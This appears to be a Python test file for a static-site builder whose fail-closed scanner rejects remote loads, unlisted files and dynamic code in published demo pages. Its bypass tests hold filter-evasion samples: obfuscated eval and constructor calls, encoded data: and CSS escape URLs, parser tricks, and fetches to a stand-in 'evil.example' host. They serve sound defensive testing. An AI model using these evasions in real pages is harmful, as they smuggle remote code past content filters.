"""Tests for build_site.py. Run: py -3 -m unittest discover -s .hosting -p "test_*.py"
Each fixture is a throwaway repo in a temp dir; the last test runs the real allowlist."""
import tempfile
import unittest
from pathlib import Path

import build_site

REPO = Path(__file__).resolve().parents[1]
PAGE = "<!doctype html><title>{t}</title><canvas></canvas><script>{js}</script>"


def make_repo(allow, files):
    tmp = tempfile.TemporaryDirectory()
    root = Path(tmp.name)
    (root / ".hosting").mkdir()
    (root / ".hosting" / "publish-allowlist.txt").write_text("# c\n" + "\n".join(allow) + "\n", encoding="utf-8")
    for rel, text in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text, encoding="utf-8")
    return tmp, root


class BuildSiteTests(unittest.TestCase):
    def build(self, allow, files):
        tmp, root = make_repo(allow, files)
        self.addCleanup(tmp.cleanup)
        return root, build_site.build(root, root / "_site")

    def test_happy_path_copies_only_allowlisted_and_writes_index(self):
        root, errors = self.build(
            ["js-demos/a/index.html"],
            {"js-demos/a/index.html": PAGE.format(t="Demo A", js="1"),
             "js-demos/a/README.md": "x", "js-demos/a/tests/t.js": "x"})
        self.assertEqual(errors, [])
        self.assertTrue((root / "_site/a/index.html").is_file())
        self.assertFalse((root / "_site/a/README.md").exists())
        self.assertFalse((root / "_site/a/tests").exists())
        index = (root / "_site/index.html").read_text(encoding="utf-8")
        self.assertIn('href="a/index.html"', index)
        self.assertIn("Demo A", index)

    def test_symlinked_entry_fails(self):
        tmp, root = make_repo(["js-demos/a/index.html"], {"excluded.txt": "secret"})
        self.addCleanup(tmp.cleanup)
        (root / "js-demos/a").mkdir(parents=True)
        try:
            (root / "js-demos/a/index.html").symlink_to(root / "excluded.txt")
        except OSError:
            self.skipTest("cannot create symlinks on this host")
        errors = build_site.build(root, root / "_site")
        self.assertTrue(any("symlink" in e for e in errors), errors)
        self.assertFalse((root / "_site").exists())

    def test_missing_allowlisted_file_fails(self):
        _, errors = self.build(["js-demos/a/index.html"], {})
        self.assertTrue(any("missing" in e for e in errors), errors)

    def test_local_reference_not_on_allowlist_fails(self):
        html = '<script src="app.js"></script>' + PAGE.format(t="A", js="1")
        root, errors = self.build(["js-demos/a/index.html"],
                                  {"js-demos/a/index.html": html, "js-demos/a/app.js": "1"})
        self.assertTrue(any("app.js" in e and "not on the allowlist" in e for e in errors), errors)
        self.assertFalse((root / "_site").exists())

    def test_local_reference_on_allowlist_passes(self):
        html = '<link rel="stylesheet" href="s.css"><script src="./app.js"></script>' + PAGE.format(t="A", js="1")
        _, errors = self.build(["js-demos/a/index.html", "js-demos/a/s.css", "js-demos/a/app.js"],
                               {"js-demos/a/index.html": html, "js-demos/a/s.css": "a{}", "js-demos/a/app.js": "1"})
        self.assertEqual(errors, [])

    def test_unquoted_local_attributes_fail(self):
        for tag in ("<script src=missing.js></script>", "<a href=missing.html>x</a>",
                    "<video poster=missing.png></video>"):
            with self.subTest(tag=tag):
                root, errors = self.build(["js-demos/a/index.html"], {"js-demos/a/index.html": tag})
                self.assertTrue(any("missing." in e and "not on the allowlist" in e for e in errors), errors)
                self.assertFalse((root / "_site").exists())

    def test_unquoted_remote_attributes_fail(self):
        for url in ("https://cdn.example/x.js", "//cdn.example/x.js"):
            with self.subTest(url=url):
                _, errors = self.build(["js-demos/a/index.html"],
                                       {"js-demos/a/index.html": f"<script SRC={url}></script>"})
                self.assertTrue(any(url in e and "remote" in e for e in errors), errors)

    def test_literal_js_url_assignments_fail(self):
        url = "https://cdn.example/x.js"
        for rel in ("js-demos/a/index.html", "js-demos/a/app.js", "js-demos/a/app.mjs"):
            for js in (f"var s=document.createElement('script');s.src='{url}';",
                       f'img.src = "{url}";', f"a.href='{url}';", f"video.poster='{url}';",
                       f"const markup = `<img src='{url}'>`;"):
                with self.subTest(rel=rel, js=js):
                    text = PAGE.format(t="A", js=js) if rel.endswith(".html") else js
                    root, errors = self.build([rel], {rel: text})
                    self.assertTrue(any(url in e and "remote" in e for e in errors), errors)
                    self.assertFalse((root / "_site").exists())

    def test_namespaced_and_data_url_attributes_fail(self):
        for rel in ("js-demos/a/index.html", "js-demos/a/image.svg"):
            for name in ("xlink:href", "data-src", "data-href", "data-poster"):
                for url in ("missing.png", "https://cdn.example/x.png"):
                    with self.subTest(rel=rel, name=name, url=url):
                        text = f"<svg><image {name}={url}></image></svg>"
                        root, errors = self.build([rel], {rel: text})
                        self.assertTrue(any(url in e for e in errors), errors)
                        self.assertFalse((root / "_site").exists())

    def test_srcset_candidates_are_checked(self):
        for url in ("missing.png", "https://cdn.example/x.png"):
            with self.subTest(url=url):
                _, errors = self.build(["js-demos/a/index.html", "js-demos/a/ok.png"],
                    {"js-demos/a/index.html": f'<img srcset="ok.png 1x, {url} 2x">',
                     "js-demos/a/ok.png": "image"})
                self.assertTrue(any(url in e for e in errors), errors)

    def test_imagesrcset_candidates_are_checked(self):
        for value in ("missing.png", '"ok.png 1x, https://example.test/missing.png 2x"'):
            with self.subTest(value=value):
                _, errors = self.build(["js-demos/a/index.html", "js-demos/a/ok.png"],
                    {"js-demos/a/index.html": f"<link rel=preload as=image imagesrcset={value}>",
                     "js-demos/a/ok.png": "image"})
                self.assertTrue(any("missing.png" in e for e in errors), errors)

    def test_meta_refresh_url_is_checked(self):
        for content, url in (("0; URL='missing.html'", "missing.html"),
                             ("0;url=https://example.test/", "https://example.test/")):
            with self.subTest(content=content):
                _, errors = self.build(["js-demos/a/index.html"],
                    {"js-demos/a/index.html": f'<meta HTTP-EQUIV=Refresh content="{content}">'})
                self.assertTrue(any(url in e for e in errors), errors)

    def test_allowlisted_attribute_candidates_pass(self):
        _, errors = self.build(["js-demos/a/index.html", "js-demos/a/ok.png"],
            {"js-demos/a/index.html": '<img src=ok.png srcset="ok.png 1x, ok.png 2x">'
                                    '<link imagesrcset="ok.png 1x, ok.png 2x">'
                                    '<meta http-equiv=refresh content="0; url=index.html">',
             "js-demos/a/ok.png": "image"})
        self.assertEqual(errors, [])

    def test_css_and_js_references_are_found(self):
        js = 'fetch("data.json"); const w = new Worker(\'w.js\');'
        html = "<style>a{background:url(bg.png)}</style>" + PAGE.format(t="A", js=js)
        _, errors = self.build(["js-demos/a/index.html"], {"js-demos/a/index.html": html})
        for name in ("bg.png", "data.json", "w.js"):
            self.assertTrue(any(name in e for e in errors), (name, errors))

    def test_computed_fetch_fails_closed(self):
        for js in ("fetch(variable)", "fetch ('ok.js' + variable)", "fetch(`ok.js/${variable}`)",
                   r"fetch('ok\x2ejs')",
                   "const message = `${fetch(variable)}`;"):
            with self.subTest(js=js):
                root, errors = self.build(["js-demos/a/index.html", "js-demos/a/ok.js"],
                    {"js-demos/a/index.html": PAGE.format(t="A", js=js), "js-demos/a/ok.js": "1"})
                self.assertTrue(any("cannot statically resolve fetch" in e for e in errors), errors)
                self.assertFalse((root / "_site").exists())

    def test_computed_import_fails_closed(self):
        for js in ("import(variable)", "import('ok.js' + variable)", "import(`ok.js/${variable}`)"):
            with self.subTest(js=js):
                _, errors = self.build(["js-demos/a/index.html", "js-demos/a/ok.js"],
                    {"js-demos/a/index.html": '<script src=ok.js></script>', "js-demos/a/ok.js": js})
                self.assertTrue(any("cannot statically resolve import" in e for e in errors), errors)

    def test_multiline_import_fails_closed(self):
        for js in ("import {\n  thing\n} from 'ok.js';", "import thing\nfrom 'ok.js';",
                   "import(\n'ok.js'\n)"):
            with self.subTest(js=js):
                _, errors = self.build(["js-demos/a/index.html", "js-demos/a/ok.js"],
                    {"js-demos/a/index.html": PAGE.format(t="A", js=js), "js-demos/a/ok.js": "1"})
                self.assertTrue(any("import" in e and "multi-line" in e for e in errors), errors)

    def test_import_literal_references_are_checked(self):
        for js in ("import('missing.js');", "import thing from 'missing.js';",
                   "import 'https://example.test/missing.js';"):
            with self.subTest(js=js):
                _, errors = self.build(["js-demos/a/index.html"],
                                       {"js-demos/a/index.html": PAGE.format(t="A", js=js)})
                self.assertTrue(any("missing.js" in e for e in errors), errors)

    def test_inline_js_attributes_are_checked(self):
        for tag, error in (('<button onclick="fetch(variable)">load</button>', "cannot statically resolve fetch"),
                           ('<a href="javascript:fetch(variable)">load</a>', "cannot statically resolve fetch"),
                           ('<a href="javascript:fetch(\'https://example.test/\')">load</a>', "remote")):
            with self.subTest(tag=tag):
                _, errors = self.build(["js-demos/a/index.html"], {"js-demos/a/index.html": tag})
                self.assertTrue(any(error in e for e in errors), errors)

    def test_service_worker_literal_reference_is_checked(self):
        for url in ("missing.js", "https://example.test/worker.js"):
            with self.subTest(url=url):
                js = f"navigator.serviceWorker.register('{url}');"
                _, errors = self.build(["js-demos/a/index.html"],
                                       {"js-demos/a/index.html": PAGE.format(t="A", js=js)})
                self.assertTrue(any(url in e for e in errors), errors)

    def test_computed_service_worker_fails_closed(self):
        for arg in ("variable", "'ok.js' + variable", "`ok.js/${variable}`"):
            with self.subTest(arg=arg):
                _, errors = self.build(["js-demos/a/index.html", "js-demos/a/ok.js"],
                    {"js-demos/a/index.html": PAGE.format(t="A", js=f"navigator.serviceWorker.register({arg});"),
                     "js-demos/a/ok.js": "1"})
                self.assertTrue(any("cannot statically resolve serviceWorker.register" in e for e in errors), errors)

    def test_literal_js_references_on_allowlist_pass(self):
        for js in ("fetch('ok.js', {cache: 'no-cache'});", "fetch(`ok.js`);", "import('ok.js');",
                   "import thing from 'ok.js';", "import 'ok.js';",
                   "const url = import.meta.url;",
                   "navigator.serviceWorker.register('ok.js', {scope: './'});"):
            with self.subTest(js=js):
                _, errors = self.build(["js-demos/a/index.html", "js-demos/a/ok.js"],
                    {"js-demos/a/index.html": PAGE.format(t="A", js=js), "js-demos/a/ok.js": "1"})
                self.assertEqual(errors, [])

    def test_js_comments_and_strings_are_not_requests(self):
        js = "// fetch('https://example.test/')\nconst message = \"fetch('https://example.test/')\";"
        _, errors = self.build(["js-demos/a/index.html"],
                               {"js-demos/a/index.html": PAGE.format(t="A", js=js)})
        self.assertEqual(errors, [])

    def test_remote_reference_fails(self):
        html = '<script src="https://cdn.example/x.js"></script>' + PAGE.format(t="A", js="1")
        _, errors = self.build(["js-demos/a/index.html"], {"js-demos/a/index.html": html})
        self.assertTrue(any("remote" in e for e in errors), errors)

    def test_inert_references_are_ignored(self):
        html = ('<a href="#x">x</a><a href="mailto:demo@example.test">mail</a>'
                "<script>a.href=URL.createObjectURL(b)</script>" + PAGE.format(t="A", js="1"))
        _, errors = self.build(["js-demos/a/index.html"], {"js-demos/a/index.html": html})
        self.assertEqual(errors, [])

    def test_disallowed_entries_fail(self):
        files = {"js-demos/a/index.html": PAGE.format(t="A", js="1"), "js-demos/a/VERIFICATION.md": "x",
                 "js-demos/a/tests/t.js": "x", "secret.html": "x"}
        for bad in ("js-demos/a/VERIFICATION.md", "js-demos/a/tests/t.js", "secret.html", "js-demos/../secret.html"):
            _, errors = self.build(["js-demos/a/index.html", bad], files)
            self.assertTrue(errors, bad)

    def test_real_allowlist_builds(self):
        with tempfile.TemporaryDirectory() as out:
            self.assertEqual(build_site.build(REPO, Path(out) / "_site"), [])


class LexerTests(unittest.TestCase):
    """#152: the JavaScript scan is a fail-closed boundary, so it must see the code the browser runs."""

    def scan(self, js, files=("ok.js",), kind="inline"):
        rel = "js-demos/a/index.html"
        tmp, root = make_repo([rel, *(f"js-demos/a/{f}" for f in files)],
                              {rel: js if kind == "raw" else PAGE.format(t="A", js=js),
                               **{f"js-demos/a/{f}": "1" for f in files}})
        self.addCleanup(tmp.cleanup)
        return build_site.build(root, root / "_site")

    def assertRejected(self, js, needle, **kw):
        errors = self.scan(js, **kw)
        self.assertTrue(any(needle in e for e in errors), (js, errors))

    def test_regex_literals_cannot_hide_code(self):
        for js in (r"""s.replace(/"/g,'&quot;'); fetch(variable); x = "a";""",
                   r"""s.replace(/'/g,'&#39;'); fetch(variable); x = 'a';""",
                   r"""const r = /\//; fetch(variable);""",
                   r"""const r = /[/]/; fetch(variable);""",
                   r"""x = y ? /"/ : /'/; fetch(variable); z = "q";""",
                   r"""if (a) { return /"/.test(b); } fetch(variable); z = "q";""",
                   r"""const t = typeof /"/; fetch(variable); z = "q";"""):
            with self.subTest(js=js):
                self.assertRejected(js, "cannot statically resolve fetch")

    def test_regex_literals_and_division_are_accepted(self):
        for js in (r"""const e = s.replace(/"/g,'&quot;').replace(/'/g,'&#39;');""",
                   r"""const ok = /[/"']/.test(s) && /\//.test(s) && /a\/\//.test(s);""",
                   "const h = (a + b) / 2, k = a / b / c, m = a[0] / 2, n = 1 / 2; i++ / 2; const q = \"'\";",
                   "function f(s){ return /\"/.test(s); }\nconst q = `x`;",
                   "const t = `${a}` / 2;"):
            with self.subTest(js=js):
                self.assertEqual(self.scan(js), [])

    def test_unterminated_constructs_fail_closed(self):
        for js in ("const a = 'x;\nfetch('ok.js');", 'const a = "x', "const a = `x", "const a = `${x",
                   "/* fetch('ok.js');", "const r = /abc\nfetch('ok.js');", "const r = /[abc/;",
                   r"fetch(variable)"):
            with self.subTest(js=js):
                self.assertTrue(self.scan(js), js)

    def test_template_expressions_are_code_and_text_is_inert(self):
        for js in ("const m = `a ${ fetch(variable) } b`;",
                   "const m = `a ${ `b ${ fetch(variable) }` } c`;",
                   "const m = `${ {a: 1}.a } ${ fetch(variable) }`;",
                   "const m = `${ x }` + fetch(variable);",
                   "const m = `${ import(variable) }`;"):
            with self.subTest(js=js):
                self.assertTrue(self.scan(js), js)
        for js in ("const m = `import now`;", "const m = `typeof fetch`;", "const m = `obj.fetch(x)`;",
                   "const m = `{import: 1}`;", "const m = `fetch(variable) new WebSocket(x)`;",
                   r"const m = `a \` fetch(variable) \${ fetch(variable) }`;",
                   "const m = `a ${ {b: 'c'}.b } import now ${ x ? `y ${ z }` : 'w' } fetch(x)`;"):
            with self.subTest(js=js):
                self.assertEqual(self.scan(js), [])

    def test_template_expression_references_are_checked(self):
        self.assertRejected("const m = `${ fetch('https://example.test/') }`;", "remote")
        self.assertRejected("const m = `${ fetch('missing.js') }`;", "not on the allowlist")
        self.assertEqual(self.scan("const m = `${ fetch('ok.js') }`;"), [])

    def test_unlisted_worker_and_script_loaders_fail_closed(self):
        for js, needle in (("new Worker(variable)", "Worker"), ("new SharedWorker(variable)", "SharedWorker"),
                           ("new Worker('ok.js' + variable)", "Worker"), ("importScripts(variable)", "importScripts"),
                           ("importScripts('ok.js', variable)", "importScripts"),
                           ("const W = Worker; new W('ok.js')", "Worker"),
                           ("const sw = navigator.serviceWorker; sw.register(variable)", "serviceWorker"),
                           ("const sw = navigator.serviceWorker; sw.register('ok.js')", "serviceWorker"),
                           ("navigator['serviceWorker']; sw.register(variable)", "global access"),
                           ("navigator.serviceWorker.getRegistration()", "serviceWorker")):
            with self.subTest(js=js):
                self.assertRejected(js, needle)

    def test_literal_workers_are_resolved_against_the_allowlist(self):
        self.assertRejected("new Worker('missing.js')", "not on the allowlist")
        self.assertRejected("importScripts('https://example.test/x.js')", "remote")
        for js in ("new Worker('ok.js');", "new SharedWorker('ok.js', {name: 'n'});", "importScripts('ok.js');"):
            with self.subTest(js=js):
                self.assertEqual(self.scan(js), [])

    def test_network_apis_are_denied(self):
        for js in ("new WebSocket('wss://example.test/')", "new WebSocket(variable)",
                   "const ws = new WebSocket('ok.js')", "new EventSource('ok.js')",
                   "new EventSource(variable)", "navigator.sendBeacon('ok.js', data)",
                   "navigator.sendBeacon(variable)", "const x = new XMLHttpRequest(); x.open('GET', variable)",
                   "const X = XMLHttpRequest; new X().open('GET', 'ok.js')", "new WebTransport(variable)"):
            with self.subTest(js=js):
                self.assertTrue(any("forbidden" in e for e in self.scan(js)), js)

    def test_denied_names_in_inert_text_are_accepted(self):
        for js in ("// new WebSocket(x)\nconst a = 'new EventSource(x)';", "const a = `sendBeacon XMLHttpRequest`;",
                   "const a = /WebSocket/;"):
            with self.subTest(js=js):
                self.assertEqual(self.scan(js), [])

    def test_executable_script_types_are_scanned(self):
        for attrs in ("", " type=module", ' type="Module "', ' type="text/javascript"', ' type="TEXT/JAVASCRIPT"',
                      ' type="application/javascript"', ' type="text/ecmascript"', ' type=""',
                      ' type="application/x-javascript"', ' type="text/jscript"', ' type="text/livescript"',
                      ' type=module nomodule'):
            with self.subTest(attrs=attrs):
                self.assertRejected(f"<script{attrs}>fetch(variable);</script>", "cannot statically resolve fetch",
                                    kind="raw")

    def test_import_maps_and_speculation_rules_are_rejected(self):
        for kind in ("importmap", "speculationrules", "ImportMap"):
            with self.subTest(kind=kind):
                self.assertRejected(f'<script type="{kind}">{{"imports": {{"a": "https://example.test/a.js"}}}}</script>',
                                    "not supported", kind="raw")

    def test_non_javascript_script_blocks_are_inert(self):
        for attrs, body in ((' type="x-shader/x-fragment"', "void main(){ import now; fetch(x); /* \"unclosed */ `"),
                            (' type="application/json"', '{"fetch": "import", "a": [1, 2'),
                            (' type="application/ld+json"', '{"@context": "fetch(variable)"}'),
                            (' type="text/plain"', "typeof fetch; new WebSocket(x)")):
            with self.subTest(attrs=attrs):
                self.assertEqual(self.scan(f"<script{attrs}>{body}</script>", kind="raw"), [])

    def test_duplicate_type_attributes_cannot_make_a_script_inert(self):
        for attrs in (' type="module" type="text/plain"', ' type="text/plain" type="module"',
                      ' type="x-shader/x-fragment" TYPE=text/javascript'):
            with self.subTest(attrs=attrs):
                self.assertRejected(f"<script{attrs}>fetch(variable);</script>",
                                    "cannot statically resolve fetch", kind="raw")
        self.assertRejected('<script type="importmap" type="text/plain">{}</script>', "not supported", kind="raw")
        self.assertEqual(self.scan('<script type="text/plain" type="application/json">fetch(</script>', kind="raw"), [])

    def test_slash_after_a_closing_brace_or_paren_cannot_hide_code(self):
        for js in ("x = {}/2; fetch('https://evil.example/x.js'); y = x/2;",
                   "x = {}/2; fetch(variable); y = x/2;",
                   "x = (a)/2; fetch(variable); y = (b)/2;",
                   "x = (a)/2; fetch('https://evil.example/x.js'); y = (b)/2;",
                   "x = `${ {}/2 }`; fetch(variable); y = `${ {}/2 }`;",
                   "if (a) /\"/.test(b); fetch(variable); z = \"q\";"):
            with self.subTest(js=js):
                self.assertTrue(self.scan(js), js)

    def test_slash_after_a_closing_brace_or_paren_is_otherwise_accepted(self):
        for js in ("const h = (a + b) / 2, k = (c)/3, m = {a: 1}.a / 2 + 1 / 3;",
                   "function f(){}\n/x/.test(s);",
                   "if (a) /x/.test(b);",
                   "const o = {}; const v = (o.a)/2 + (o.b)/4;",
                   "const m = `${ {}/2 } ${ (a)/3 }`;"):
            with self.subTest(js=js):
                self.assertEqual(self.scan(js), [])

    def test_export_from_references_are_checked(self):
        for js, needle in (("export * from 'missing.js';", "not on the allowlist"),
                           ("export * as ns from 'https://example.test/x.js';", "remote"),
                           ("export {a} from 'missing.js';", "not on the allowlist"),
                           ("export {\n  a,\n  b as c\n} from 'missing.js';", "not on the allowlist"),
                           ("export { a as default } from 'https://example.test/x.js'", "remote"),
                           ("export * from variable;", "cannot statically resolve export"),
                           ("export { 'a}' as b } from 'missing.js';", "cannot statically resolve export")):
            with self.subTest(js=js):
                self.assertRejected(js, needle)

    def test_local_exports_and_allowlisted_re_exports_pass(self):
        for js in ("export * from 'ok.js';", "export * as ns from 'ok.js';", "export {a} from \"ok.js\";",
                   "const a = 1; export {a}; export {a as b};", "export const x = 1; export default function(){}",
                   "export default {from: 1};", "export function f(){ return /\"/.test(s); }"):
            with self.subTest(js=js):
                self.assertEqual(self.scan(js), [])

    def test_script_text_split_across_parser_chunks_is_one_unit(self):
        js = "const a = 'x < y'; const b = a < 2 && 3 > 1; fetch(variable);"
        self.assertRejected(js, "cannot statically resolve fetch")
        self.assertEqual(self.scan("const a = 'x < y'; const b = a < 2 && 3 > 1;"), [])

    def test_inert_script_blocks_still_expose_attribute_references(self):
        self.assertRejected('<script type="application/json" src="https://example.test/x.json"></script>',
                            "remote", kind="raw")


class ScannerBypassTests(unittest.TestCase):
    """#156/#158: rejection must happen before any publication output is touched."""

    scan = LexerTests.scan

    def reject(self, source, **kw):
        self.assertTrue(self.scan(source, **kw), source)

    def test_eval_is_rejected(self):
        for js in ("eval(code)", "(0, eval)(code)", "const run = eval; run(code)",
                   "eval /* comment */ (code)"):
            with self.subTest(js=js):
                self.reject(js)

    def test_function_constructor_is_rejected(self):
        for js in ("Function(code)()", "new Function(code)()", "const F = Function; F(code)()"):
            with self.subTest(js=js):
                self.reject(js)

    def test_indirect_function_constructors_are_rejected(self):
        for js in ('''(function(){}).constructor("return globalThis['fetch']('https://example.test/x')")();''',
                   "const F = (() => {}).constructor; F(source)()",
                   "obj /* gap */ . /* gap */ constructor(source)()",
                   "obj?.constructor(source)()", "obj['constructor'](source)()",
                   'obj["con" + "structor"](source)()',
                   "(function(){})[key](source)()", "(() => {})?.[key](source)()"):
            with self.subTest(js=js):
                self.reject(js)

    def test_this_aliases_and_computed_string_keys_are_rejected(self):
        for js in ('const g=this;g["fe"+"tch"]("https://example.test/x");',
                   'const g=(this);g[key](url)', 'const g={root:this};g.root[key](url)',
                   'const g = (() => this)(); g[key](url)',
                   'obj["fe" + "tch"](url)', "obj?.['fe' + 'tch'](url)",
                   r"obj['con\x73tructor'](source)()", 'obj[`constructor`](source)()'):
            with self.subTest(js=js):
                self.reject(js)

    def test_safe_literal_keys_and_instance_identity_are_accepted(self):
        for js in ("PRESETS['fault-line'](); obj[\"name\"] = values[index];",
                   "class Vec { constructor(x) { this.x = x; } }",
                   "if (other !== this) work(); if (other === this && ok) work();",
                   "const text = '.constructor(code)'; const keys = ['constructor'];"):
            with self.subTest(js=js):
                self.assertEqual(self.scan(js), [])

    def test_opaque_resource_urls_are_rejected(self):
        css = "data:text/css;base64,QGltcG9ydCAnaHR0cHM6Ly9leGFtcGxlLnRlc3QveC5jc3MnOw=="
        for markup in (f'<link rel=stylesheet href="{css}">',
                       '<link rel=stylesheet href="data:text/css,@import\'https://example.test/x.css\';">',
                       f'<link rel=stylesheet href="{css.replace("data:", "&#100;ata:")}">',
                       '<svg><image href="data:image/svg+xml,opaque"></image></svg>',
                       '<img src="data:image/svg+xml,opaque">',
                       '<img srcset="data:image/svg+xml,opaque 1x">',
                       '<link imagesrcset="data:image/svg+xml,opaque 1x">'):
            with self.subTest(markup=markup):
                self.reject(markup, kind="raw")

    def test_decoded_css_references_are_rejected(self):
        for markup in ('<div style="background:u&#114;l(https://example.test/x)"></div>',
                       r'<style>@\69mport "https://example.test/x.css";</style>',
                       r'<style>@\000069 mport "https://example.test/x.css";</style>',
                       r'<style>a{background:\75rl(https://example.test/x)}</style>',
                       r'<div style="background:u\72 l(https://example.test/x)"></div>',
                       r'<style>a{background:url(\68 ttps://example.test/x)}</style>',
                       r'<style>@impor\t "https://example.test/x.css";</style>'):
            with self.subTest(markup=markup):
                self.reject(markup, kind="raw")

    def test_external_css_escapes_are_rejected(self):
        for css in (r'@\69mport "https://example.test/x.css";',
                    r'a{background:u\72l(missing.png)}'):
            with self.subTest(css=css):
                tmp, root = make_repo(["js-demos/a/style.css"], {"js-demos/a/style.css": css})
                self.addCleanup(tmp.cleanup)
                self.assertTrue(build_site.build(root, root / "_site"))
                self.assertFalse((root / "_site").exists())

    def test_decoded_allowlisted_css_references_are_accepted(self):
        for markup in ('<div style="background:u&#114;l(ok.js)"></div>',
                       r'<style>@\69mport "ok.js";</style>',
                       r'<style>a{background:u\72 l(\6f k.js)}</style>'):
            with self.subTest(markup=markup):
                self.assertEqual(self.scan(markup, kind="raw"), [])

    def test_duplicate_meta_attributes_cannot_hide_refresh(self):
        for attrs in ('http-equiv=refresh http-equiv=ignored content="0;url=https://example.test/x"',
                      'http-equiv=refresh content="0;url=https://example.test/x" content="0"',
                      'HTTP-EQUIV=refresh http-equiv=ignored CONTENT="0;url=missing.html"',
                      'http-equiv=refresh content="0;url=missing.html" CONTENT="0;url=index.html"'):
            with self.subTest(attrs=attrs):
                self.reject(f'<meta {attrs}>', kind="raw")

    def test_string_timers_are_rejected(self):
        for timer in ("setTimeout", "setInterval"):
            for arg in ("'run()'", '"run()"', "`run()`", "source", "('run()')",
                        "/* comment */ 'run()'", "() => {}, 0), setTimeout('run()'"):
                with self.subTest(timer=timer, arg=arg):
                    self.reject(f"{timer}({arg}, 10)")
            self.reject(f"const timer = {timer}; timer(source, 10)")
            for arg in ("function() {} + code", "function() {}.toString()", "function() {} ? code : code"):
                with self.subTest(timer=timer, arg=arg):
                    self.reject(f"{timer}({arg}, 10)")

    def test_literal_function_timers_are_accepted(self):
        for js in ("setTimeout(() => work(), 10)", "setInterval(function tick() { work(); }, 10)",
                   "window.setTimeout(function() {}, 10)", "setTimeout(x => work(x), 10)",
                   "setTimeout /* gap */ (/* callback */ () => work(), 10)",
                   "setTimeout(function() { const s = '}'; const r = /}/; if (x) { work(); } }, 10)",
                   "setTimeout(function() { const t = `${ {a: 1}.a }`; }, 10)",
                   "setInterval((a, b) => work(a, b), 10)"):
            with self.subTest(js=js):
                self.assertEqual(self.scan(js), [])

    def test_timer_callback_bodies_are_scanned(self):
        for js in ("setTimeout(() => eval(code), 10)", "setTimeout(function() { eval(code); }, 10)",
                   "setTimeout(function() { fetch(variable); }, 10)", "setTimeout(function() { work(); ",
                   "setTimeout(function fetch() {}, 10)", "setTimeout(function(fetch) {}, 10)"):
            with self.subTest(js=js):
                self.reject(js)

    def test_computed_globals_are_rejected(self):
        for js in ("window['fe'+'tch'](url)", "globalThis[x](url)", "self[`fetch`](url)",
                   "window /* gap */ ['Function'](code)", "window?.[x](url)",
                   "(window)['fetch'](url)", "const g = globalThis; g[x](url)",
                   "const {fetch: f} = window; f(url)", "this[x](url)",
                   "(this)[x](url)", "(parent)?.[x](url)",
                   "navigator['send'+'Beacon'](url)", "document['defaultView'][x](url)",
                   "document.defaultView[x](url)", "top[x](url)", "parent[x](url)", "frames[x](url)"):
            with self.subTest(js=js):
                self.reject(js)

    def test_legitimate_dynamic_code_lookalikes_are_accepted(self):
        for js in ("const text = 'eval(x) Function(x) window[x] setTimeout(code)';",
                   "const text = `globalThis[x] self[x] new Function(x)`;",
                   "// eval(x) window[x]\n/* Function(x) */ const r = /setTimeout|eval/;",
                   "const evaluate = 1, Functionality = 2; obj[key] = values[index];",
                   "const top = 9; const y = top + rect.top; if (other === this) return;",
                   "window.addEventListener('click', () => work()); this.value = 1;"):
            with self.subTest(js=js):
                self.assertEqual(self.scan(js), [])

    def test_srcdoc_and_nested_unquoted_or_encoded_urls_are_rejected(self):
        for markup in ('<iframe srcdoc="&lt;img src=missing.png&gt;"></iframe>',
                       '<iframe srcdoc="&lt;img src=&amp;#104;ttps://example.test/x&gt;"></iframe>',
                       '<iframe srcdoc="<script>eval(code)</script>"></iframe>',
                       '<iframe srcdoc=""></iframe>'):
            with self.subTest(markup=markup):
                self.reject(markup, kind="raw")

    def test_additional_url_attributes_are_checked(self):
        for tag, attr in (("object", "data"), ("embed", "src"), ("form", "action"),
                          ("button", "formaction"), ("body", "background"), ("blockquote", "cite"),
                          ("img", "longdesc"), ("html", "manifest"), ("object", "codebase"),
                          ("object", "classid"), ("head", "profile"), ("a", "ping"),
                          ("object", "archive"), ("img", "lowsrc"), ("img", "dynsrc")):
            for url in ("missing.js", "https://example.test/x", "&#104;ttps://example.test/x"):
                with self.subTest(tag=tag, attr=attr, url=url):
                    self.reject(f"<{tag} {attr}={url}></{tag}>", kind="raw")
        self.reject('<a ping="ok.js https://example.test/x">link</a>', kind="raw")
        self.reject('<object archive="ok.js missing.js"></object>', kind="raw")
        self.reject('<img attributionsrc="ok.js https://example.test/x">', kind="raw")

    def test_allowlisted_additional_url_attributes_are_accepted(self):
        self.assertEqual(self.scan('<object data=ok.js></object><embed src=ok.js>'
                                   '<form action=index.html><button formaction=index.html></button></form>'
                                   '<a ping="ok.js ok.js">link</a>', kind="raw"), [])
        self.assertEqual(self.scan('<div data-label="srcdoc eval Function"></div>'
                                   '<!-- <iframe srcdoc="ignored"> -->', kind="raw"), [])

    def test_data_script_sources_are_rejected(self):
        for src in ("data:text/javascript,eval(code)", "data:text/javascript;base64,ZXZhbChjb2RlKQ==",
                    "&#100;ata:text/javascript,eval(code)", "blob:local-id"):
            with self.subTest(src=src):
                self.reject(f'<script src="{src}"></script>', kind="raw")

    def test_embedded_document_data_urls_are_rejected(self):
        for markup in ('<iframe src="data:text/html,&lt;img src=missing.png&gt;"></iframe>',
                       '<object data="data:text/html,&lt;script&gt;eval(code)&lt;/script&gt;"></object>',
                       '<embed src="data:text/html,&lt;img src=missing.png&gt;">'):
            with self.subTest(markup=markup):
                self.reject(markup, kind="raw")

    def test_every_js_line_terminator_ends_a_line_comment(self):
        for end in ("\r", "\n", "\r\n", "\u2028", "\u2029"):
            with self.subTest(end=repr(end)):
                self.reject(f"// harmless{end}fetch(variable)")
                self.assertEqual(self.scan(f"// eval(code){end}const a = 1;"), [])

    def test_html_comment_markers_in_scripts_are_rejected(self):
        for js in ('<!-- `\nfetch(variable); // `',
                   'const a = 1;\n--> `\nfetch(variable); // `'):
            with self.subTest(js=js):
                self.reject(js)
                with self.assertRaises(ValueError):
                    list(build_site.js_refs(js))  # external classic scripts have the same JS comments
        self.assertEqual(list(build_site.js_refs("const s = '<!-- -->'; const r = /<!--/;")), [])
        self.reject('<script type="application/json"><!-- <script>\n//</script>'
                    '\n<img src=missing.png>\n</script>', kind="raw")

    def test_htmlparser_double_escape_is_rejected(self):
        # HTMLParser exits script data at the first end tag. Browsers stay in the
        # double-escaped script until that tag, then execute the following fetch.
        markup = '<script><!-- <script>\n//</script>\nfetch(variable); //\n</script>'
        chunks = []
        parser = build_site.HTMLParser()
        parser.handle_data = chunks.append
        parser.feed(markup)
        parser.close()
        self.assertEqual(chunks[0], "<!-- <script>\n//")
        self.reject(markup, kind="raw")

    def test_rejections_preserve_existing_output(self):
